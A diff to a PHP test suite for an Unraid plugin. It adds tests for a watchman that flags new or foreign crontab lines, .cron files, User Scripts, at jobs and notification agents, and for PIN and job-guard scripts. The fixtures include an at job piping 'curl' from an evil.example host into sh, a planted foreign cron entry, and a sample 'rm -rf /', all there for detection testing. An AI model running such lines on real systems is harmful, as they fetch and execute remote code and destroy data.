@@ -16,9 +16,11 @@ declare(strict_types=1);
  *            the engine's lock was busy (and who holds it), Ms. Dustdevil's pictures,
  *            Mr. Restori's reader of the packages and his restores (steps, put back, the lock, a job on its own),
  *            the Consultant's monitoring externals and his installs, Ms. Protocolli's tour,
- *            the night watchman's rounds, bursts, baseline and «I know, thanks»)
+ *            the night watchman's rounds, bursts, baseline and «I know, thanks», his watch over what
+ *            starts on its own (crontabs, .cron files, User Scripts, at, notification agents),
+ *            job.sh's guard against a second start in the same minute)
  *   hardening  the checks that keep requests, manifests, paths and links in
- *            bounds (PIN tries, safe writes, the mailbox, Ms. Dustdevil's
+ *            bounds (PIN tries, pin.sh unblock/reset, safe writes, the mailbox, Ms. Dustdevil's
  *            manifests, Emby paths, anchored validators, the release link, the
  *            Consultant's secrets for Kopia: RAM only, never in a file, log or ps)
  *   strings  German and English have the same keys, Italian has every English
@@ -1407,6 +1409,232 @@ function testWatchman(): void
     exec('rm -rf ' . escapeshellarg($tmp));
 }
 
+/**
+ * The night watchman's watch over what starts on its own: root's own crontab next to Unraid's (new
+ * lines, lines in both, the office's own lines, programs gone, the syslog as evidence), the plugins'
+ * .cron files, User Scripts, atd's queue, the notification agents — all on copies in a temporary folder.
+ */
+function testWatchmanSched(): void
+{
+    $now = strtotime('2026-10-06 12:00:00');
+    // the pieces
+    same('sched: job lines, normalised, without comments and settings', ['*/5 * * * * a b', '@daily c'],
+        watchmanCronJobs("# x\nSHELL=/bin/sh\n*/5  *\t* * *  a   b\n\n@daily c\n"));
+    same('sched: the program behind an interpreter, none for inline code or a name', ['/usr/local/x/run.php', '/a/b.sh', null, null, '/x'],
+        [watchmanCronProgram('/usr/bin/php -q /usr/local/x/run.php arg'), watchmanCronProgram('nice -n 10 bash "/a/b.sh" x'),
+         watchmanCronProgram("sh -c 'rm -rf /'"), watchmanCronProgram('logger hello'), watchmanCronProgram('timeout 60 LANG=C /x')]);
+    $gone = fn (string $p) => false;
+    same('sched: a program gone with its plugin (never under /mnt)', ['vmbackup', null, null],
+        [watchmanCronGone('/usr/local/emhttp/plugins/vmbackup/runscript.php', $gone), watchmanCronGone('/mnt/user/x/y.sh', $gone),
+         watchmanCronGone('/usr/local/sbin/mdcmd', $gone)]);
+    $short = watchmanCronShort('*/10 * * * * curl -s -u admin:hunter2 https://hc-ping.com/0123456789abcdef0123456789abcdef?x=1 PASSWORD=geheim > /dev/null 2>&1');
+    check('sched: a line shown without its secrets', str_starts_with($short, '*/10 * * * * curl') && str_contains($short, 'hc-ping.com')
+        && !preg_match('/hunter2|0123456789abcdef|geheim|dev\/null/', $short), $short);
+    same('sched: the plugins\' folders shortened', '0 1 * * * bash unraid-secretary-office/scripts/job.sh backup',
+        watchmanCronShort('0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1'));
+
+    // a whole watch, on copies
+    $tmp = sys_get_temp_dir() . '/office-tests-sched-' . getmypid();
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['crontabs', 'cron.d', 'flash/dynamix', 'flash/unraid-secretary-office', 'flash/user.scripts/scripts/Alt', 'flash/user.scripts/scripts/Plan',
+              'flash/user.scripts/scripts/Aus', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg",
+              'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d", 'cron_files' => "$src/flash",
+              'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n");
+    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
+    file_put_contents($paths['syslog'], $line($now - 60, 'kernel: up'));
+    $system = "# Generated system monitoring schedule:\n*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n\n"
+            . "# Unraid Secretary Office - written by the office, change it there\n"
+            . "0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n"
+            . "1 12 * * * /usr/local/emhttp/plugins/user.scripts/startCustom.php /boot/config/plugins/user.scripts/scripts/CKW Batch 2026/script > /dev/null 2>&1\n";
+    file_put_contents("$src/cron.d/root", $system);
+    $vmb = "# Job for VM Backup plugin default:\n58 3 * * 6 /usr/local/emhttp/plugins/dynamix/scripts/monitor run_backup default > /dev/null 2>&1\n";
+    file_put_contents("$src/crontabs/root", $vmb);
+    file_put_contents("$src/flash/dynamix/monitor.cron", "# Generated system monitoring schedule:\n*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n\n");
+    file_put_contents("$src/flash/dynamix/old.cron", "0 4 * * * /usr/local/emhttp/plugins/dynamix/scripts/statuscheck &> /dev/null\n");
+    file_put_contents("$src/flash/unraid-secretary-office/unraid-secretary-office.cron", "0 1 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n");
+    foreach (['unraid-secretary-office', 'user.scripts', 'parity.check.tuning'] as $p) {
+        file_put_contents("$src/logplugins/$p.plg", "<PLUGIN name=\"$p\" version=\"1\">\n");
+    }
+    foreach (['Alt' => 'echo alt', 'Plan' => 'echo plan', 'Aus' => 'echo aus'] as $n => $body) {
+        file_put_contents("$src/flash/user.scripts/scripts/$n/script", "#!/bin/bash\n$body\n");
+    }
+    $sched = fn (array $s) => json_encode(array_combine(array_map(fn ($n) => "/boot/config/plugins/user.scripts/scripts/$n/script", array_keys($s)),
+        array_map(fn ($n, $f) => ['script' => "/boot/config/plugins/user.scripts/scripts/$n/script", 'frequency' => str_contains($f, ' ') ? 'custom' : $f,
+                                  'id' => "schedule$n", 'custom' => str_contains($f, ' ') ? $f : ''], array_keys($s), $s)));
+    file_put_contents("$src/flash/user.scripts/schedule.json", $sched(['Alt' => '0 3 * * *', 'Plan' => 'daily', 'Aus' => 'weekly']));
+    file_put_contents("$src/agents/Discord.sh", "#!/bin/bash\nWEBHOOK='https://discord.com/api/webhooks/1/old-token'\n");
+    $ours = "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nPATH=/usr/bin; export PATH\ncd /root || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n"
+          . "#!/bin/sh\n" . HOST_LAUNCH_MARK . "\nexec /bin/bash /usr/local/emhttp/plugins/unraid-secretary-office/backup/backup.sh </dev/null >/dev/null 2>&1\n";
+    file_put_contents("$src/atjobs/a0000101c2b3a4", $ours);
+    $notified = "$tmp/notified";
+    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
+    chmod("$tmp/notify", 0755);
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
+    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
+    $open = function () use ($data): array {
+        $n = array_count_values(array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), 'kind'));
+        ksort($n);
+        return $n;
+    };
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+
+    $r = watchmanRound($paths, $data, 1000, $now, $docker, true, $acks);
+    $b = watchmanLoad($data)['baseline']['sched'] ?? [];
+    same('sched: taking over, all of it is normal', [true, [], [], 1, 3, 3, 0, 1],
+        [$r['fresh'], $r['added'], $open(), count($b['crontab']['lines'] ?? []), count($b['files'] ?? []), count($b['scripts'] ?? []), count($b['at'] ?? []),
+         count($b['agents'] ?? [])]);
+
+    // the night: root's own crontab becomes a copy of Unraid's, with an old copy of the office's line, a new line, a gone program
+    $t = $now + 500;
+    file_put_contents($paths['syslog'], $line($t - 700, 'www[9]: /usr/local/emhttp/plugins/far/away.sh too early')
+        . $line($t - 20, 'webgui: Unsuccessful login user hunter2.sh from 192.168.7.66')
+        . $line($t - 10, "ool www[3899811]: /usr/local/emhttp/plugins/vmbackup/scripts/commands.sh 'update_user_script' 'default'")
+        . $line($t, 'kernel: eth0: link up')
+        . $line($t + 30, 'crond[1234]: updating crontab for root')
+        . $line($t + 400, 'www[9]: /usr/local/emhttp/plugins/late/after.sh too late'), FILE_APPEND);
+    file_put_contents("$src/crontabs/root", $vmb . $system
+        . "0 2 * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh backup > /dev/null 2>&1\n"
+        . "*/10 * * * * curl -s https://hc-ping.com/0123456789abcdef0123456789abcdef > /dev/null\n"
+        . "0 3 * * * /usr/local/emhttp/plugins/gone-plugin-uso-test/run.sh\n");
+    touch("$src/crontabs/root", $t);
+    file_put_contents("$src/flash/unraid-secretary-office/unraid-secretary-office.cron", "*/5 * * * * bash /usr/local/emhttp/plugins/unraid-secretary-office/scripts/job.sh snapshots > /dev/null 2>&1\n", FILE_APPEND);
+    file_put_contents("$src/flash/dynamix/monitor.cron", "# Generated system monitoring schedule:\n");     // lines gone: normal
+    @mkdir("$src/flash/evilplug");
+    file_put_contents("$src/flash/evilplug/evil.cron", "* * * * * /tmp/.x/run\n");
+    @mkdir("$src/flash/parity.check.tuning");
+    file_put_contents("$src/flash/parity.check.tuning/parity.check.tuning.cron", "0 8 * * * /usr/local/emhttp/plugins/parity.check.tuning/x.php resume\n");
+    @mkdir("$src/flash/user.scripts/scripts/Neu");
+    file_put_contents("$src/flash/user.scripts/scripts/Neu/script", "#!/bin/bash\necho neu\n");
+    file_put_contents("$src/flash/user.scripts/scripts/Alt/script", "#!/bin/bash\necho alt, but more\n");
+    file_put_contents("$src/flash/user.scripts/schedule.json", $sched(['Alt' => '0 3 * * *', 'Plan' => 'start', 'Aus' => 'disabled', 'Neu' => '*/5 * * * *']));
+    file_put_contents("$src/atjobs/a0000201c2b3b0", "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nSECRET_KEY=xyzzy-abc; export SECRET_KEY\ncd /tmp || {\n\t echo 'x' >&2\n\t exit 1\n}\n"
+        . "\${SHELL:-/bin/sh} << 'marcinDELIMITER0a1b2c3d'\ncurl -s https://evil.example/payload?token=abc | sh\nmarcinDELIMITER0a1b2c3d\n");
+    touch("$src/atjobs", $t);
+    file_put_contents("$src/agents/Discord.sh", "#!/bin/bash\nWEBHOOK='https://discord.com/api/webhooks/1/new-token'\n");
+    touch("$src/agents/Discord.sh", $t);           // same size: the time tells it changed
+    file_put_contents("$src/agents/Pushover.sh", "#!/bin/bash\nTOKEN='pushover-secret-token'\n");
+    $r = watchmanRound($paths, $data, 1000, $now + 600, $docker, true, $acks);
+    same('sched: one entry for each thing that differs', ['at_job' => 1, 'cron_dead' => 1, 'cron_file' => 2, 'cron_file_foreign' => 1, 'cron_new' => 1,
+        'cron_office' => 1, 'cron_twice' => 1, 'notify_agent' => 2, 'script_changed' => 2, 'script_new' => 1], $open());
+    $by = [];
+    foreach (array_filter(watchmanLoad($data)['book'], 'watchmanOpen') as $e) {
+        $by[$e['kind']][] = $e;
+    }
+    $twice = $by['cron_twice'][0];
+    same('sched twice: how many, which (the office\'s line apart)', [2, '*/1 * * * * dynamix/scripts/monitor'], [$twice['p']['lines'], $twice['p']['jobs'][0] ?? null]);
+    same('sched twice: the fix as information', "crontab -l > /boot/config/crontab-root-before-cleanup.txt; crontab -l | grep -v -x -F -f <(grep -v '^#' /etc/cron.d/root | grep -v '^\\s*$') | crontab -",
+        watchmanText($twice)['fix']);
+    same('sched: the office\'s own lines called out (the copy and the old one)', ['0 1 * * * bash unraid-secretary-office/scripts/job.sh backup',
+        '0 2 * * * bash unraid-secretary-office/scripts/job.sh backup'], $by['cron_office'][0]['p']['jobs']);
+    same('sched: the new lines, a token left out', ['*/10 * * * * curl -s https://hc-ping.com/…', '0 3 * * * gone-plugin-uso-test/run.sh'], $by['cron_new'][0]['p']['jobs']);
+    same('sched: a program gone with its plugin', ['/usr/local/emhttp/plugins/gone-plugin-uso-test/run.sh', 'gone-plugin-uso-test'],
+        [$by['cron_dead'][0]['p']['path'], $by['cron_dead'][0]['p']['plugin']]);
+    $ev = $twice['p']['evidence'] ?? [];
+    same('sched evidence: the file\'s time, the lines around it that name a plugin or cron — no login, nothing far off',
+        [$t, [date('H:i:s', $t - 10) . " ool www[3899811]: /usr/local/emhttp/plugins/vmbackup/scripts/commands.sh 'update_user_script' 'default'",
+              date('H:i:s', $t + 30) . ' crond[1234]: updating crontab for root']], [$twice['p']['mtime'], $ev]);
+    $files = array_column(array_map(fn ($e) => [$e['p']['file'], $e['p']], $by['cron_file']), 1, 0);
+    same('sched .cron: the office\'s own file changed (plain), a plugin\'s new file (plain), one of no installed plugin (important)',
+        [true, false, true, 1, 'evilplug/evil.cron', true],
+        [$files['unraid-secretary-office/unraid-secretary-office.cron']['office'] ?? null, $files['unraid-secretary-office/unraid-secretary-office.cron']['new'] ?? null,
+         $files['parity.check.tuning/parity.check.tuning.cron']['new'] ?? null, $files['unraid-secretary-office/unraid-secretary-office.cron']['lines'] ?? null,
+         $by['cron_file_foreign'][0]['p']['file'], WATCH_KINDS['cron_file_foreign'][1]]);
+    $scripts = array_column(array_map(fn ($e) => [$e['p']['name'], $e['p']], $by['script_changed']), 1, 0);
+    same('sched scripts: new, changed content, a schedule now at the array\'s start; switched off is normal',
+        ['Neu', '*/5 * * * *', true, ['start', 'daily', false], false],
+        [$by['script_new'][0]['p']['name'], $by['script_new'][0]['p']['cron'], $scripts['Alt']['content'] ?? null,
+         [$scripts['Plan']['cron'] ?? null, $scripts['Plan']['old'] ?? null, $scripts['Plan']['content'] ?? null], isset($scripts['Aus'])]);
+    $at = $by['at_job'][0]['p'];
+    same('sched at: only the foreign job, what it runs without its environment or token', ['a0000201c2b3b0', 'curl -s https://evil.example/… | sh', 0, hexdec('01c2b3b0') * 60],
+        [$at['job'], $at['cmd'], $at['uid'], $at['when']]);
+    same('sched agents: a new one, a changed one', [['Discord.sh' => false, 'Pushover.sh' => true]],
+        [array_column(array_map(fn ($e) => [$e['p']['name'], $e['p']['new']], $by['notify_agent']), 1, 0)]);
+    $all = '';
+    foreach (glob("$data/*.json") ?: [] as $f) {
+        $all .= file_get_contents($f);
+    }
+    check('sched: no secret in his files (tokens, the at job\'s environment, an agent\'s content)',
+        !preg_match('/0123456789abcdef0123|xyzzy|SECRET_KEY|token=abc|new-token|old-token|pushover-secret|hunter2/', $all));
+    $told = array_column($r['told'], 'kind');
+    sort($told);
+    same('sched: the important kinds go to Unraid\'s notifications', ['at_job', 'cron_file_foreign', 'cron_new', 'cron_office', 'cron_twice', 'notify_agent'], $told);
+
+    // the same again: nothing new; then «I know, thanks» on everything — the new normal
+    $r = watchmanRound($paths, $data, 1000, $now + 900, $docker, true, $acks);
+    same('sched: seen again — nothing new', [], $r['added']);
+    watchmanAck('*', $data, $now + 1000, false);
+    $r = watchmanRound($paths, $data, 1000, $now + 1200, $docker, true, $acks);
+    same('sched: noted — the same state reports nothing', [[], []], [$r['added'], $open()]);
+    $b = watchmanLoad($data)['baseline']['sched'];
+    same('sched: noted is normal (doubled lines, the office\'s line, the gone program, the foreign .cron, the at job, the agent)', [2, 2, true, true, true, true],
+        [count($b['crontab']['twice']), count($b['crontab']['office']), isset($b['crontab']['dead']['/usr/local/emhttp/plugins/gone-plugin-uso-test/run.sh']),
+         isset($b['files']['evilplug/evil.cron']), isset($b['at']['a0000201c2b3b0']), isset($b['agents']['Pushover.sh'])]);
+
+    // cleaned up by hand — normal; doubled again later — told again
+    file_put_contents("$src/crontabs/root", $vmb);
+    touch("$src/crontabs/root", $now + 1300);
+    $r = watchmanRound($paths, $data, 1000, $now + 1500, $docker, true, $acks);
+    same('sched: the doubles removed — nothing to tell, no longer normal', [[], 0], [$r['added'], count(watchmanLoad($data)['baseline']['sched']['crontab']['twice'])]);
+    file_put_contents("$src/crontabs/root", $vmb . $system);
+    touch("$src/crontabs/root", $now + 1600);
+    $r = watchmanRound($paths, $data, 1000, $now + 1800, $docker, true, $acks);
+    same('sched: doubled again — told again', ['cron_office', 'cron_twice'], (function (array $a) { sort($a); return $a; })($r['added']));
+
+    // the page: what he keeps an eye on, no internals
+    $page = watchmanPageState($data, $now + 2000, false);
+    same('sched page: root\'s lines, the .cron files, User Scripts, at, agents', [1, 5, 4, 1, ['Discord.sh', 'Pushover.sh']],
+        [count($page['watch']['sched']['crontab']), count($page['watch']['sched']['files']), count($page['watch']['sched']['scripts']),
+         $page['watch']['sched']['at'], $page['watch']['sched']['agents']]);
+    check('sched page: no fingerprints', !str_contains(json_encode($page), '"_h"') && !str_contains(json_encode($page), '"_f"'));
+
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($data, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/** job.sh: a second start of the same job in the same minute ends quietly, with one line for the syslog */
+function testJobGuard(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-jobsh-' . getmypid();
+    @mkdir("$tmp/plugin/scripts", 0700, true);
+    $script = (string) file_get_contents(OFFICE_DIR . '/plugin/scripts/job.sh');
+    $script = str_replace(['DIR=/usr/local/emhttp/plugins/unraid-secretary-office', 'RUN=/var/run/unraid-secretary-office', 'logger -t unraid-secretary-office'],
+                          ["DIR=$tmp/plugin", "RUN=$tmp/run", "echo >> $tmp/syslog"], $script, $n);
+    same('job guard: the copy points to the test folder', 3, $n);
+    file_put_contents("$tmp/job.sh", $script);
+    file_put_contents("$tmp/plugin/scripts/agent.sh", "echo \"\$1\" >> $tmp/ran\n");
+    $run = function () use ($tmp): string {
+        exec('bash ' . escapeshellarg("$tmp/job.sh") . ' watch 2>&1', $out, $code);
+        return "$code";
+    };
+    for ($i = 0; $i < 2; $i++) {        // a minute turning between the two starts: once more
+        @unlink("$tmp/ran");
+        @unlink("$tmp/syslog");
+        @unlink("$tmp/run/job-watch.minute");
+        $minute = date('YmdHi');
+        $codes = [$run(), $run()];
+        if (date('YmdHi') === $minute) {
+            break;
+        }
+    }
+    same('job guard: the first start runs, the second in the same minute ends quietly', [['0', '0'], "watch\n", "job watch: second start in the same minute skipped\n"],
+        [$codes, @file_get_contents("$tmp/ran"), @file_get_contents("$tmp/syslog")]);
+    file_put_contents("$tmp/run/job-watch.minute", "200001010000\n");
+    $run();
+    same('job guard: another minute runs again', "watch\nwatch\n", @file_get_contents("$tmp/ran"));
+    same('job guard: an unknown job is refused before anything', '2', (function () use ($tmp) { exec('bash ' . escapeshellarg("$tmp/job.sh") . ' nope', $o, $c); return "$c"; })());
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
 // ===================================================================== notifications
 
 /**
@@ -2369,6 +2597,76 @@ function testPinTries(): void
     hardeningRm($dir);
 }
 
+/**
+ * pin.sh in Unraid's terminal, on a temporary data folder: status tells, unblock lifts only the waits
+ * (PIN and secret stay — an unlocked browser stays unlocked), reset forgets the PIN; auth.json stays
+ * 0600 with its owner (the web server's user), a lock it creates gets the folder's owner, a link is refused.
+ */
+function testPinScript(): void
+{
+    require_once OFFICE_DIR . '/src/auth.php';          // officeUnlockSignature(): what the page signs a browser's unlock with
+    $tmp = hardeningTmp('pinsh');
+    $office = "$tmp/data/office";
+    @mkdir($office, 0700, true);
+    $file = "$office/auth.json";
+    $now = time();
+    $auth = ['pin_hash' => password_hash('2468', PASSWORD_DEFAULT), 'secret' => bin2hex(random_bytes(32)), 'failures' => 7, 'wait_until' => 0, 'read' => true,
+             'clients' => ['192.168.7.50' => ['f' => 6, 'w' => $now + 300, 't' => $now], '2001:db8::/64' => ['f' => 1, 'w' => 0, 't' => $now]]];
+    file_put_contents($file, json_encode($auth));
+    chmod($file, 0600);
+    foreach ([$file, $office] as $f) {          // the web server's user (in the stack www-data; here nobody:users)
+        chown($f, 99);
+        chgrp($f, 100);
+    }
+    $pin = function (string $what, ?string $data = null) use ($tmp): array {
+        exec('OFFICE_DATA_DIR=' . escapeshellarg($data ?? "$tmp/data") . ' bash ' . escapeshellarg(OFFICE_DIR . '/plugin/scripts/pin.sh') . ' ' . escapeshellarg($what) . ' 2>&1', $out, $code);
+        return [$code, implode("\n", $out)];
+    };
+    $owner = function (string $f): string {
+        clearstatcache();
+        $st = @lstat($f);
+        return $st ? sprintf('%d:%d %o', $st['uid'], $st['gid'], $st['mode'] & 0777) : 'missing';
+    };
+
+    [$code, $out] = $pin('status');
+    check('pin.sh status: PIN, looking, the tries, who waits', $code === 0 && str_contains($out, 'PIN: set (looking needs it too)')
+        && str_contains($out, '7 of ' . OFFICE_GLOBAL_TRIES) && preg_match('/192\.168\.7\.50\s+6 wrong, waits [45] min/', $out) === 1, $out);
+
+    $until = $now + 3600;
+    $before = officeUnlockSignature($auth, $until);
+    [$code, $out] = $pin('unblock');
+    $after = json_decode((string) file_get_contents($file), true) ?: [];
+    same('pin.sh unblock: the waits gone, PIN, secret and «looking» kept', [0, 0, 0, false, $auth['pin_hash'], $auth['secret'], true],
+        [$code, $after['failures'] ?? null, $after['wait_until'] ?? null, isset($after['clients']), $after['pin_hash'] ?? null, $after['secret'] ?? null, $after['read'] ?? null]);
+    same('pin.sh unblock: an unlocked browser stays unlocked', $before, officeUnlockSignature($after, $until));
+    same('pin.sh unblock: auth.json 0600 with its owner, the new lock the folder\'s', ['99:100 600', '99:100'],
+        [$owner($file), substr($owner("$office/.auth.lock"), 0, 6)]);
+    check('pin.sh unblock: says what it did', str_contains($out, '7 wrong tries forgotten, those of 2 device(s)'), $out);
+    [$code, $out] = $pin('unblock');
+    check('pin.sh unblock again: nothing to do', $code === 0 && str_contains($out, 'Nobody was waiting'), $out);
+
+    [$code, $out] = $pin('reset');
+    same('pin.sh reset: the PIN forgotten, the file stays 0600 with its owner', [0, [], '99:100 600'],
+        [$code, json_decode((string) file_get_contents($file), true), $owner($file)]);
+    [$code, $out] = $pin('status');
+    check('pin.sh status after reset: no PIN', $code === 0 && str_contains($out, 'PIN: not set'), $out);
+    [$code, $out] = $pin('reset');
+    check('pin.sh reset again: nothing to do', $code === 0 && str_contains($out, 'No PIN was set'), $out);
+
+    // a link in place of auth.json: refused, the other file untouched
+    file_put_contents("$tmp/elsewhere.json", json_encode(['pin_hash' => 'x', 'failures' => 9]));
+    unlink($file);
+    symlink("$tmp/elsewhere.json", $file);
+    [$code, $out] = $pin('unblock');
+    same('pin.sh: a link in place of auth.json is refused', [1, ['pin_hash' => 'x', 'failures' => 9]],
+        [$code, json_decode((string) file_get_contents("$tmp/elsewhere.json"), true)]);
+    unlink($file);
+
+    same('pin.sh: an unknown word, no data folder', [2, 1], [$pin('open')[0], $pin('status', "$tmp/none")[0]]);
+    same('pin.sh: no temporary files left', [], glob("$office/.auth.*.tmp") ?: []);
+    hardeningRm($tmp);
+}
+
 /** writeAtomic(): a link at the target or a file in the way is never written through; the mode is there from the start */
 function testSafeWrites(): void
 {
@@ -2830,8 +3128,8 @@ function testIconSquare(): void
 // ===================================================================== run
 
 $parts = ['logic' => ['testCron', 'testRetention', 'testSnapshotNames', 'testEmby', 'testUserScripts', 'testOfficeCron', 'testMenuName', 'testEstimates', 'testNotify', 'testCaretakerAcks',
-                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testAdvisor', 'testAdvisorInstall', 'testLogsTour', 'testMetrics', 'testWatchman', 'testComposeBuilds'],
-          'hardening' => ['testPinTries', 'testSafeWrites', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets'],
+                      'testBackupPackages', 'testBackupKopiaItems', 'testBackupSkip', 'testIcons', 'testIconSquare', 'testRestore', 'testRestoreJobs', 'testAdvisor', 'testAdvisorInstall', 'testLogsTour', 'testMetrics', 'testWatchman', 'testWatchmanSched', 'testJobGuard', 'testComposeBuilds'],
+          'hardening' => ['testPinTries', 'testPinScript', 'testSafeWrites', 'testTrashManifest', 'testEmbyPaths', 'testAnchors', 'testUpdateClean', 'testAdvisorSecrets'],
           'strings' => ['testStrings']];
 $only = $argv[1] ?? '';
 foreach ($parts as $name => $fns) {
